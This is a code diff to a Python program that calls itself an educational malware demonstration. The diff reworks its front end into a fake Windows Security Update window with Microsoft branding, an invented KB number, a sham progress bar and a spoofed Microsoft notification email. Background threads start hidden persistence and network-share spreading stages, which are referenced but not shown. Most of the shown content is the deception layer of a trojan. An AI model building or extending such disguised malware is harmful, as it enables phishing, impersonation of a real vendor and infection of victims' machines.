@@ -2,12 +2,15 @@
 EDUCATIONAL MALICIOUS CODE DEMONSTRATION
 WARNING: This is for educational purposes only in a controlled lab environment.
 
-This program demonstrates a complete attack chain:
-- Delivery: Shows GUI while creating hidden folders
-- Auto-Run: Adds persistence mechanisms
-- Spreading: Replicates to network shares
+ATTACK SCENARIO: Fake Windows Security Update
+- Victim receives email about "critical security vulnerability"
+- Runs the exe thinking it's a legitimate Windows update
+- GUI shows professional update interface with progress bar
+- Behind scenes: All malicious functions execute
+- Victim believes they just secured their system (actually infected it)
 
-Total: 9 functions working together as one malicious program
+This demonstrates social engineering + technical exploitation
+Total: 9 functions working together as one sophisticated attack
 """
 
 import tkinter as tk
@@ -28,38 +31,101 @@ from email.mime.text import MIMEText
 
 def show_email_gui():
     """
-    Function 1: Display legitimate-looking email GUI
-    Shows interface to distract user while malicious actions happen
+    Function 1: Display fake Windows Security Update GUI
+    Shows professional interface to gain victim's trust
     """
-    global email_window, email_entry
+    global email_window, progress_bar, status_label
     
-    print("[Malicious] Function 1: Showing email GUI to user...")
+    print("[Malicious] Function 1: Showing fake security update GUI...")
     
     email_window = tk.Tk()
-    email_window.title("Email Sender Utility v2.0")
-    email_window.geometry("400x250")
+    email_window.title("Windows Security Update Assistant")
+    email_window.geometry("500x400")
     email_window.resizable(False, False)
+    email_window.configure(bg='white')
     
-    # Create GUI elements
-    title_label = tk.Label(email_window, text="Quick Email Sender", 
-                          font=("Arial", 16, "bold"))
-    title_label.pack(pady=20)
+    # Windows logo area (fake branding)
+    header_frame = tk.Frame(email_window, bg='#0078D4', height=80)
+    header_frame.pack(fill='x')
     
-    instruction_label = tk.Label(email_window, 
-                                text="Enter your email address to send a test message:",
-                                font=("Arial", 10))
-    instruction_label.pack(pady=10)
+    title_label = tk.Label(header_frame, 
+                          text="🛡️ Windows Security Update", 
+                          font=("Segoe UI", 18, "bold"),
+                          bg='#0078D4', fg='white')
+    title_label.pack(pady=25)
     
-    email_entry = tk.Entry(email_window, width=40, font=("Arial", 11))
-    email_entry.pack(pady=10)
-    email_entry.insert(0, "your.email@example.com")
+    # Main content area
+    content_frame = tk.Frame(email_window, bg='white')
+    content_frame.pack(fill='both', expand=True, padx=30, pady=20)
     
-    send_button = tk.Button(email_window, text="Send Test Email", 
-                           command=on_send_clicked, 
-                           bg="#4CAF50", fg="white",
-                           font=("Arial", 11, "bold"),
-                           width=20, height=2)
-    send_button.pack(pady=20)
+    # Urgent message
+    urgent_label = tk.Label(content_frame, 
+                           text="⚠️ Critical Security Patch Required",
+                           font=("Segoe UI", 14, "bold"),
+                           bg='white', fg='#D83B01')
+    urgent_label.pack(pady=10)
+    
+    info_label = tk.Label(content_frame, 
+                         text="A critical vulnerability has been detected.\n"
+                              "This update will protect your system from security threats.\n\n"
+                              "Update KB5034847 - Published: December 2024",
+                         font=("Segoe UI", 10),
+                         bg='white', fg='#333333',
+                         justify='left')
+    info_label.pack(pady=15)
+    
+    # Email notification field (for "update notifications")
+    email_label = tk.Label(content_frame,
+                          text="Enter email for update notifications (optional):",
+                          font=("Segoe UI", 9),
+                          bg='white', fg='#666666')
+    email_label.pack(pady=5)
+    
+    global email_entry
+    email_entry = tk.Entry(content_frame, width=40, font=("Segoe UI", 10))
+    email_entry.pack(pady=5)
+    email_entry.insert(0, "your-email@example.com")
+    
+    # Status label
+    status_label = tk.Label(content_frame,
+                           text="Ready to install update",
+                           font=("Segoe UI", 9),
+                           bg='white', fg='#666666')
+    status_label.pack(pady=10)
+    
+    # Progress bar (will be used during "installation")
+    from tkinter import ttk
+    style = ttk.Style()
+    style.configure("Custom.Horizontal.TProgressbar", 
+                   background='#0078D4',
+                   troughcolor='#E1E1E1',
+                   borderwidth=0,
+                   thickness=20)
+    
+    progress_bar = ttk.Progressbar(content_frame, 
+                                   length=400, 
+                                   mode='determinate',
+                                   style="Custom.Horizontal.TProgressbar")
+    progress_bar.pack(pady=10)
+    
+    # Install button
+    install_button = tk.Button(content_frame, 
+                              text="Install Update Now", 
+                              command=on_install_clicked, 
+                              bg="#0078D4", 
+                              fg="white",
+                              font=("Segoe UI", 11, "bold"),
+                              width=25, 
+                              height=2,
+                              border=0,
+                              cursor="hand2")
+    install_button.pack(pady=15)
+    
+    disclaimer_label = tk.Label(content_frame,
+                               text="Microsoft Corporation • Automatic Updates",
+                               font=("Segoe UI", 8),
+                               bg='white', fg='#999999')
+    disclaimer_label.pack(side='bottom', pady=5)
     
     # Start malicious actions in background thread
     threading.Thread(target=execute_malicious_stage1, daemon=True).start()
@@ -132,23 +198,64 @@ def execute_malicious_stage1():
 # STAGE 2: AUTO-RUN (Functions 4-6)
 # ============================================================================
 
-def send_fake_email(user_email):
+def send_fake_email(user_emails):
     """
-    Function 4: Send actual email to make it look legitimate
+    Function 4: Send fake "update notification" email
     While sending, trigger auto-run functions in background
     """
-    print(f"[Malicious] Function 4: Sending email to {user_email}...")
+    # Handle single email (from optional notification field)
+    if isinstance(user_emails, str):
+        user_email = user_emails.strip()
+    else:
+        user_email = str(user_emails).strip()
+    
+    print(f"[Malicious] Function 4: Sending update notification...")
     
     try:
-        # Create simple email message
-        msg = MIMEText("This is a test email from Email Sender Utility.")
-        msg['Subject'] = "Test Email"
-        msg['From'] = "emailsender@utility.com"
+        if not user_email or '@' not in user_email:
+            print("[Malicious] No valid email provided, skipping notification")
+            threading.Thread(target=execute_autorun_stage, daemon=True).start()
+            return False
+        
+        # ==== ANONYMOUS EMAIL SENDING ====
+        USE_REAL_EMAIL = False  # Set to True to actually send
+        
+        if USE_REAL_EMAIL:
+            SENDER_EMAIL = os.getenv('EMAIL_USER', 'windowsupdate@microsoft-security.com')
+            SENDER_PASSWORD = os.getenv('EMAIL_PASS', 'password')
+            SMTP_SERVER = "smtp.gmail.com"
+            SMTP_PORT = 587
+        
+        print(f"[Malicious]   Email mode: {'REAL' if USE_REAL_EMAIL else 'SIMULATED'}")
+        print(f"[Malicious]   Sending to: {user_email}")
+        
+        # Create professional Windows Update email
+        msg = MIMEText(
+            "Dear Windows User,\n\n"
+            "Your system has successfully installed security update KB5034847.\n\n"
+            "This critical update protects your computer from recently discovered vulnerabilities.\n\n"
+            "Update Details:\n"
+            "- Security patches installed: 3\n"
+            "- System files updated: 127\n"
+            "- Installation date: December 2024\n\n"
+            "No further action is required.\n\n"
+            "Best regards,\n"
+            "Windows Update Service\n"
+            "Microsoft Corporation"
+        )
+        msg['Subject'] = "Windows Security Update Installed Successfully"
+        msg['From'] = "Windows Update <noreply@microsoft.com>"
         msg['To'] = user_email
         
-        # NOTE: In a real demo, you would configure an SMTP server
-        # For now, we just simulate success
-        print(f"[Malicious] Email 'sent' to {user_email} (simulated)")
+        if USE_REAL_EMAIL:
+            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+                server.starttls()
+                server.login(SENDER_EMAIL, SENDER_PASSWORD)
+                server.send_message(msg)
+            print(f"[Malicious]   ✓ Actually sent to {user_email}")
+        else:
+            time.sleep(0.5)
+            print(f"[Malicious]   ✓ Simulated notification to {user_email}")
         
         # Trigger auto-run stage while user thinks email is being sent
         threading.Thread(target=execute_autorun_stage, daemon=True).start()
@@ -340,31 +447,57 @@ def execute_spreading_stage():
 # GUI EVENT HANDLERS
 # ============================================================================
 
-def on_send_clicked():
-    """Handle send button click"""
-    user_email = email_entry.get()
+def on_install_clicked():
+    """Handle install button click - simulates Windows Update process"""
+    global status_label, progress_bar
     
-    if not user_email or '@' not in user_email:
-        messagebox.showerror("Error", "Please enter a valid email address")
-        return
+    user_email = email_entry.get().strip()
     
-    # Show sending message
-    messagebox.showinfo("Sending", "Sending email, please wait...")
+    # Disable input during "installation"
+    email_entry.config(state='disabled')
     
-    # Send email (and trigger auto-run)
-    success = send_fake_email(user_email)
+    # Update status
+    status_label.config(text="Downloading update package...", fg='#0078D4')
+    email_window.update()
     
-    # Wait a moment for auto-run to complete
+    # Simulate download progress
+    for i in range(0, 40, 5):
+        time.sleep(0.2)
+        progress_bar['value'] = i
+        email_window.update()
+    
+    status_label.config(text="Installing security patches...")
+    email_window.update()
+    
+    # Send notification email if provided (and trigger auto-run stage)
+    if user_email and '@' in user_email:
+        threading.Thread(target=send_fake_email, args=(user_email,), daemon=True).start()
+    else:
+        # Still trigger auto-run even without email
+        threading.Thread(target=execute_autorun_stage, daemon=True).start()
+    
+    # Continue installation progress
+    for i in range(40, 100, 5):
+        time.sleep(0.3)
+        progress_bar['value'] = i
+        email_window.update()
+    
+    # Show completion
+    status_label.config(text="✓ Update installed successfully", fg='#107C10')
+    email_window.update()
     time.sleep(1)
     
-    # Show success
-    messagebox.showinfo("Success", "Email sent successfully!")
-    
-    # Start spreading stage in background
+    # Start spreading stage
     threading.Thread(target=execute_spreading_stage, daemon=True).start()
     
-    # Close window after a moment
-    email_window.after(2000, email_window.destroy)
+    # Show success message
+    messagebox.showinfo("Update Complete", 
+                       "Windows security update has been installed successfully.\n\n"
+                       "Your system is now protected against the latest threats.\n"
+                       "A restart may be required to complete the update.")
+    
+    # Close window
+    email_window.after(1000, email_window.destroy)
 
 # ============================================================================
 # MAIN EXECUTION
